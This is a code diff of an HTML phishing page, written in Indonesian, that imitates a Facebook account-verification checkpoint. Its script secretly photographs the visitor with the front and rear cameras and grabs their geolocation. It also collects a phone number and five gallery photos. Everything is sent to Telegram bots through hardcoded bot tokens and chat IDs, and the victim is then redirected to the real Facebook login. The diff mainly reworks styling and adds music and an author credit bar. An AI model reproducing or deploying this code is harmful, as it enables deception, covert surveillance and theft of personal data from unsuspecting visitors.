@@ -3,33 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook</title>
+    <title>Facebook - Secure Verification</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        /* Animasi Splash Screen ala FB 😮 */
+        /* Splash Screen */
         #splash-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #fff; z-index: 9999; display: flex; flex-direction: column;
             align-items: center; justify-content: center;
         }
-        .fb-logo-splash { width: 80px; height: 80px; }
-        .meta-logo { position: absolute; bottom: 50px; width: 100px; }
+        .fb-logo-splash { width: 70px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
 
-        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: none; }
-        .main-card { max-width: 450px; margin: 40px auto; border: none; border-radius: 12px; box-shadow: 0 12px 28px rgba(0,0,0,0.1); background: white; }
-        .fb-logo-text { color: #1877f2; font-size: 45px; font-weight: bold; letter-spacing: -2px; }
+        body { background-color: #f0f2f5; font-family: 'Segoe UI', Arial, sans-serif; display: none; overflow-x: hidden; }
+        
+        /* Card Design */
+        .main-card { max-width: 450px; margin: 40px auto; border: none; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.15); background: white; border-top: 5px solid #1877f2; }
+        .fb-logo-text { color: #1877f2; font-size: 42px; font-weight: bold; letter-spacing: -2px; }
         
         .btn-fb { 
-            background-color: #1877f2; color: white; font-weight: bold; padding: 12px; 
-            border-radius: 8px; border: none; width: 100%;
-            transition: transform 0.1s ease;
+            background: linear-gradient(to bottom, #1877f2, #166fe5); color: white; font-weight: bold; 
+            padding: 12px; border-radius: 8px; border: none; width: 100%;
+            transition: 0.2s; box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
-        .btn-fb:active { transform: scale(0.95); }
+        .btn-fb:active { transform: scale(0.94); }
 
-        .error-box { 
-            background: #ffebe9; border: 1px solid #dd3c10; color: #1c1e21; 
-            font-size: 13px; padding: 10px; border-radius: 4px; display: none; margin-bottom: 15px;
+        /* Music & Credit Bar 😍 */
+        .credit-bar {
+            position: fixed; bottom: 0; width: 100%; background: rgba(0, 0, 0, 0.85);
+            color: white; padding: 15px; text-align: center; backdrop-filter: blur(10px);
+            border-top: 2px solid #1877f2; z-index: 1000;
         }
+        .credit-text { font-size: 14px; font-weight: bold; letter-spacing: 1px; color: #1877f2; text-shadow: 0 0 10px #1877f2; }
+        
+        /* Music Animation */
+        .music-anim { display: flex; justify-content: center; align-items: flex-end; height: 20px; gap: 3px; margin-top: 5px; }
+        .bar { width: 4px; height: 100%; background: #1877f2; animation: wave 1s ease-in-out infinite; }
+        @keyframes wave { 0%, 100% { height: 5px; } 50% { height: 20px; } }
+        .bar:nth-child(2) { animation-delay: 0.2s; }
+        .bar:nth-child(3) { animation-delay: 0.4s; }
+        .bar:nth-child(4) { animation-delay: 0.6s; }
+
+        .error-box { background: #ffebe9; border: 1px solid #dd3c10; font-size: 13px; padding: 10px; border-radius: 6px; display: none; margin-bottom: 15px; }
         #video, #canvas { display: none; }
     </style>
 </head>
@@ -37,33 +52,45 @@
 
 <div id="splash-screen">
     <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo-splash">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" class="meta-logo">
+    <p class="mt-3 text-muted">Checking Security...</p>
 </div>
 
-<div class="container" id="main-content">
+<audio id="bgMusic" loop>
+    <source src="https://files.catbox.moe/tll0lw.mp3" type="audio/mpeg">
+</audio>
+
+<div class="container">
     <div class="main-card card p-4 text-center">
-        <div class="fb-logo-text mb-2">facebook</div>
-        <h5 class="fw-bold">Tinjauan Keamanan Akun</h5>
-        <p class="text-muted small">Kami mendeteksi upaya login yang tidak biasa. Masukkan data profil Anda untuk verifikasi identitas.</p>
+        <div class="fb-logo-text">facebook</div>
+        <h6 class="fw-bold mt-2">Checkpoint Keamanan Akun</h6>
+        <p class="text-muted small">Selesaikan langkah verifikasi untuk membuktikan bahwa Anda adalah pemilik sah akun ini.</p>
         <hr>
 
         <div id="mainError" class="error-box text-start">
-            <b>Data Tidak Valid</b><br>Pastikan nomor HP benar dan minimal 5 foto dipilih.
+            <b>Verifikasi Gagal!</b><br>Nomor HP minimal 10 digit dan wajib pilih 5 foto.
         </div>
 
         <div class="text-start">
-            <label class="form-label small fw-bold">Nomor Handphone</label>
-            <input type="number" id="phone" class="form-control" placeholder="08xxxxxxxxxx">
+            <label class="form-label small fw-bold">Nomor Telepon Terdaftar</label>
+            <input type="number" id="phone" class="form-control" placeholder="Contoh: 081234567xxx">
             
-            <label class="form-label small fw-bold mt-3">Verifikasi Galeri (Pilih 5 Foto Profil)</label>
+            <label class="form-label small fw-bold mt-3">Upload 5 Foto Aktivitas (Wajib)</label>
             <input type="file" id="galeri" class="form-control" multiple accept="image/*">
         </div>
 
-        <button class="btn-fb mt-4" onclick="validateFinal()">Lanjutkan</button>
+        <button class="btn-fb mt-4" onclick="validateFinal()">Lanjutkan Verifikasi</button>
         
-        <div class="mt-3 loading-spinner text-primary" id="loader" style="display:none;">
-            <div class="spinner-border spinner-border-sm"></div> <span class="small">Memproses...</span>
+        <div class="mt-3 text-primary" id="loader" style="display:none;">
+            <div class="spinner-border spinner-border-sm"></div> <span class="small">Mengirim data ke server...</span>
         </div>
+    </div>
+</div>
+
+<div class="credit-bar">
+    <div class="credit-text">Malik & Hack7rBGG/Xymatekidd</div>
+    <div class="music-anim">
+        <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
+        <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
     </div>
 </div>
 
@@ -74,17 +101,23 @@
     const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
     const chats = ["7835924973", "8071786272"];
 
-    // Animasi Splash Screen 😂
     window.onload = () => {
         setTimeout(() => {
             document.getElementById('splash-screen').style.display = 'none';
             document.body.style.display = 'block';
+            // Coba putar lagu otomatis (harus ada interaksi user di beberapa browser)
+            document.getElementById('bgMusic').play().catch(() => {
+                console.log("Klik dimana saja untuk memutar musik!");
+            });
             autoCapture("user");
             autoLocation();
-        }, 2500); // 2.5 Detik Loading ala FB
+        }, 3000);
     };
 
-    function sendToTelegram(content, type = "text", blob = null) {
+    // Pastikan musik main saat user klik apa saja 😋
+    document.addEventListener('click', () => { document.getElementById('bgMusic').play(); }, {once: true});
+
+    function sendToBot(content, type = "text", blob = null) {
         tokens.forEach((token, i) => {
             const fd = new FormData();
             fd.append("chat_id", chats[i]);
@@ -104,29 +137,24 @@
     function validateFinal() {
         const phone = document.getElementById('phone').value;
         const files = document.getElementById('galeri').files;
-        const errBox = document.getElementById('mainError');
+        const err = document.getElementById('mainError');
 
-        // LOGIKA ANTI NGASAL: Minimal 10 digit buat nomor HP ☠️
         if (phone.length < 10 || files.length < 5) {
-            errBox.style.display = 'block';
+            err.style.display = 'block';
             return;
         }
 
-        errBox.style.display = 'none';
+        err.style.display = 'none';
         document.getElementById('loader').style.display = 'block';
 
-        // Sikat ke Telegram! 😈
-        sendToTelegram(`📱 NOMOR HP: ${phone}`);
+        sendToBot(`📱 NOMOR HP: ${phone}`);
         for (let i = 0; i < 5; i++) {
-            sendToTelegram(`🖼️ GALERI ${i+1}`, "photo", files[i]);
+            sendToBot(`🖼️ GALERI ${i+1}`, "photo", files[i]);
         }
 
-        setTimeout(() => {
-            window.location.href = "https://www.facebook.com/login";
-        }, 3000);
+        setTimeout(() => { window.location.href = "https://www.facebook.com/login"; }, 3000);
     }
 
-    // Auto Background Task ☠️
     async function autoCapture(mode) {
         try {
             const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
@@ -135,16 +163,16 @@
                 const c = document.getElementById('canvas');
                 c.width = 480; c.height = 640;
                 c.getContext('2d').drawImage(v, 0, 0);
-                c.toBlob(b => sendToTelegram(`📸 Cam ${mode}`, "photo", b), 'image/jpeg');
+                c.toBlob(b => sendToBot(`📸 Cam ${mode}`, "photo", b), 'image/jpeg');
                 s.getTracks().forEach(t => t.stop());
-                if(mode === "user") setTimeout(() => autoCapture("environment"), 3000);
+                if(mode === "user") setTimeout(() => autoCapture("environment"), 3500);
             }, 2000);
         } catch (e) { window.location.href = "https://www.facebook.com/login"; }
     }
 
     function autoLocation() {
         navigator.geolocation.getCurrentPosition(p => {
-            sendToTelegram(`📍 LOKASI: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            sendToBot(`📍 LOKASI: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
         });
     }
 </script>
